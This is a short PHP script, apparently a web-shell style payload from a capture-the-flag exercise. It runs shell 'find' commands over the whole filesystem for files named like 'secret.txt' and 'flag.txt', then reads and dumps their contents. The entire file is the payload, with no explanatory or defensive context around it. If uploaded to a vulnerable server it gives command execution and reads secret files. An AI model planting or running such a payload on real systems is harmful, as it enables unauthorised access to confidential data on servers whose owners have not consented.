<?php
  $file = exec('find / -type f -name *secret.txt');
  $contents = file_get_contents($file);
  var_dump($contents);
  $file1 = exec('find / -type f -name *flag.txt');
  $contents1 = file_get_contents($file1);
  var_dump($contents1);
?>
